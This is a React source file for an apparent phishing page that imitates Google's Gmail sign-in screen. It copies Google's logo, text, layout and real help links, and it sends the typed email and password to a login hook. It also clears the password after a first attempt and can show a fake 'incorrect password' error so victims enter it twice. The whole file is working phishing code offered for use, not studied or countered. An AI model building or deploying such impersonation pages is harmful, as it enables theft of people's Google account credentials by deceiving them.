import React, { useState, useEffect } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface GmailLoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  defaultEmail?: string;
  startAtPasswordStep?: boolean;
  incorrectPasswordError?: string;
}

// Custom floating label input for Google style
const GoogleInput = ({ value, onChange, label, type = "text", autoFocus = false }: any) => {
  const [isFocused, setIsFocused] = useState(false);
  const hasValue = value.length > 0;

  return (
    <div className="relative mt-1">
      <input
        type={type}
        value={value}
        onChange={onChange}
        onFocus={() => setIsFocused(true)}
        onBlur={() => setIsFocused(false)}
        autoFocus={autoFocus}
        className={`w-full px-3 py-4 text-base bg-transparent border rounded-md outline-none transition-colors
          ${isFocused ? 'border-blue-600 border-2' : 'border-gray-400'}`}
      />
      <label
        className={`absolute left-2 transition-all duration-200 ease-in-out pointer-events-none
          ${(isFocused || hasValue) ? `text-xs -top-2.5 bg-white px-1 ${isFocused ? 'text-blue-600' : 'text-gray-600'}` : 'text-base top-4 left-3 text-gray-500'}`}
      >
        {label}
      </label>
    </div>
  );
};


const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail, startAtPasswordStep, incorrectPasswordError }) => {
  const [email, setEmail] = useState(defaultEmail || '');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(!!startAtPasswordStep);
  // When mounted via the IncorrectPasswordPage (startAtPasswordStep=true), skip
  // the 100ms pageReady gate so the password-step error UI renders immediately
  // — without flashing the spinner or any of the email-step UI.
  const [pageReady, setPageReady] = useState(!!startAtPasswordStep);
  const [isTransitioning, setIsTransitioning] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  useEffect(() => {
    const timer = setTimeout(() => setPageReady(true), 100);
    return () => clearTimeout(timer);
  }, []);

  const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) {
      // Show an in-page progress bar at the top of the SAME email card
      // (mimicking Google's real loading bar) for ~1s, then transition to
      // the password step. No separate full-page "spinning sign-in" route.
      setIsTransitioning(true);
      setTimeout(() => {
        setShowPasswordStep(true);
        setIsTransitioning(false);
      }, 1000);
    }
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: 'Gmail' });
    if (result?.isFirstAttempt) { setPassword(''); }
  };

  if (!pageReady) {
    return (
      <div className="min-h-screen bg-[#f0f4f9] flex items-center justify-center">
        <Spinner size="lg" color="border-blue-600" />
      </div>
    );
  }

  const GoogleLogo = () => (
    <svg viewBox="0 0 48 48" className="h-10 w-10" xmlns="http://www.w3.org/2000/svg">
      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
    </svg>
  );

  return (
    <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]" style={{ animation: 'fadeIn 0.3s ease-in' }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div 
          className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12 relative overflow-hidden"
          style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
        >
          {/* Inline Google-style progress bar shown on the email step while
              we wait to transition to the password step. Mimics Google's real
              loading bar — no separate full-page "Signing in…" route. */}
          {isTransitioning && (
            <div className="absolute top-0 left-0 right-0 h-[3px] bg-blue-100 overflow-hidden" aria-hidden="true">
              <div className="h-full bg-blue-600" style={{ animation: 'signingProgress 1s ease-in-out forwards' }} />
              <style>{`
                @keyframes signingProgress {
                  0% { width: 0%; }
                  100% { width: 100%; }
                }
              `}</style>
            </div>
          )}
          <form onSubmit={handleSubmit}>
            <div className="flex flex-col md:flex-row md:gap-16">
              {/* Left Column: Logo and heading */}
              <div className="md:w-1/2 md:pt-4">
                <GoogleLogo />
                {!showPasswordStep ? (
                  <>
                    <h1 className="text-[36px] leading-[44px] font-normal text-gray-900 mt-8">Sign in</h1>
                    <p className="text-[16px] leading-6 text-gray-900 mt-4 max-w-md">
                      with your Google Account to continue to Gmail. This account will be available to other Google apps in the browser.
                    </p>
                  </>
                ) : (
                  <>
                    <h1 className="text-[36px] leading-[44px] font-normal text-gray-900 mt-8">Welcome</h1>
                    <div className="mt-6">
                      <button type="button" className="inline-flex items-center space-x-2 px-2 py-1 border border-gray-300 rounded-full hover:bg-gray-50 transition-colors">
                        <div className="w-7 h-7 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-semibold">
                          {email.charAt(0).toUpperCase()}
                        </div>
                        <span className="text-sm text-gray-800 pr-1">{email}</span>
                        <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                        </svg>
                      </button>
                    </div>
                  </>
                )}
              </div>

              {/* Right Column: Form */}
              <div className="md:w-1/2 mt-10 md:mt-0 flex flex-col">
                {errorMessage && !isLoading && (
                  <div className="text-red-600 text-sm font-medium mb-4">{errorMessage}</div>
                )}
                {!errorMessage && incorrectPasswordError && (
                  <div className="text-red-600 text-sm font-medium mb-4">{incorrectPasswordError}</div>
                )}

                {!showPasswordStep ? (
                  // Email Step
                  <>
                    <GoogleInput value={email} onChange={(e: any) => setEmail(e.target.value)} label="Email or phone" type="email" autoFocus />
                    <a href="https://accounts.google.com/signin/v2/recovery/identifier" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline mt-3 inline-block">
                      Forgot email?
                    </a>
                    <p className="text-sm text-gray-700 mt-10">
                      Not your computer? Use Guest mode to sign in privately.{' '}
                      <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline font-semibold">Learn more about using Guest mode</a>
                    </p>
                    <div className="flex justify-between items-center mt-12">
                      <a href="https://accounts.google.com/signup" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline">
                        Create account
                      </a>
                      <button onClick={handleNext} disabled={!email || isTransitioning} className="px-6 py-2.5 bg-blue-600 text-white text-sm font-semibold rounded-full hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
                        Next
                      </button>
                    </div>
                  </>
                ) : (
                  // Password Step
                  <>
                    <GoogleInput 
                      value={password} 
                      onChange={(e: any) => setPassword(e.target.value)} 
                      label="Enter your password" 
                      type={showPassword ? "text" : "password"} 
                      autoFocus 
                    />
                    <div className="flex items-center mt-4">
                      <input
                        type="checkbox"
                        id="showPassword"
                        checked={showPassword}
                        onChange={(e) => setShowPassword(e.target.checked)}
                        className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
                      />
                      <label htmlFor="showPassword" className="ml-2 text-sm text-gray-700 cursor-pointer">
                        Show password
                      </label>
                    </div>
                    <div className="flex justify-between items-center mt-12">
                      <a href="https://accounts.google.com/signin/v2/challenge/password/recovery" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline">
                        Forgot password?
                      </a>
                      <button type="submit" disabled={isLoading || !password} className="px-6 py-2.5 bg-blue-600 text-white text-sm font-semibold rounded-full hover:bg-blue-700 disabled:opacity-50 transition-colors">
                         {isLoading ? <Spinner size="sm" color="border-white" /> : 'Next'}
                      </button>
                    </div>
                  </>
                )}
              </div>
            </div>
          </form>
        </div>
      </main>

      <footer className="w-full max-w-[960px] mx-auto flex justify-between items-center px-4 py-6 text-xs text-gray-700">
        <div>
          <select className="bg-transparent text-gray-600 py-2 pr-6 border-0 outline-none cursor-pointer">
            <option value="en" selected>English (United States)</option>
            <option value="af">Afrikaans</option>
            <option value="az">Azərbaycan</option>
            <option value="id">Bahasa Indonesia</option>
            <option value="ms">Bahasa Melayu</option>
            <option value="ca">Català</option>
            <option value="cs">Čeština</option>
            <option value="da">Dansk</option>
            <option value="de">Deutsch</option>
            <option value="et">Eesti</option>
            <option value="en-GB">English (United Kingdom)</option>
            <option value="es">Español (España)</option>
            <option value="es-419">Español (Latinoamérica)</option>
            <option value="eu">Euskara</option>
            <option value="fil">Filipino</option>
            <option value="fr">Français (France)</option>
            <option value="fr-CA">Français (Canada)</option>
            <option value="gl">Galego</option>
            <option value="hr">Hrvatski</option>
            <option value="zu">IsiZulu</option>
            <option value="is">Íslenska</option>
            <option value="it">Italiano</option>
            <option value="sw">Kiswahili</option>
            <option value="lv">Latviešu</option>
            <option value="lt">Lietuvių</option>
            <option value="hu">Magyar</option>
            <option value="nl">Nederlands</option>
            <option value="no">Norsk</option>
            <option value="pl">Polski</option>
            <option value="pt-BR">Português (Brasil)</option>
            <option value="pt-PT">Português (Portugal)</option>
            <option value="ro">Română</option>
            <option value="sk">Slovenčina</option>
            <option value="sl">Slovenščina</option>
            <option value="fi">Suomi</option>
            <option value="sv">Svenska</option>
            <option value="vi">Tiếng Việt</option>
            <option value="tr">Türkçe</option>
            <option value="el">Ελληνικά</option>
            <option value="bg">Български</option>
            <option value="ru">Русский</option>
            <option value="sr">Српски</option>
            <option value="uk">Українська</option>
            <option value="he">עברית</option>
            <option value="ar">العربية</option>
            <option value="fa">فارسی</option>
            <option value="am">አማርኛ</option>
            <option value="mr">मराठी</option>
            <option value="hi">हिन्दी</option>
            <option value="bn">বাংলা</option>
            <option value="gu">ગુજરાતી</option>
            <option value="ta">தமிழ்</option>
            <option value="te">తెలుగు</option>
            <option value="kn">ಕನ್ನಡ</option>
            <option value="ml">മലയാളം</option>
            <option value="th">ไทย</option>
            <option value="ko">한국어</option>
            <option value="zh-HK">中文 (香港)</option>
            <option value="zh-CN">中文 (简体)</option>
            <option value="zh-TW">中文 (繁體)</option>
            <option value="ja">日本語</option>
          </select>
        </div>
        <div className="flex items-center space-x-4">
          <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
          <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
          <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
        </div>
      </footer>
    </div>
  );
};

export default GmailLoginPage;
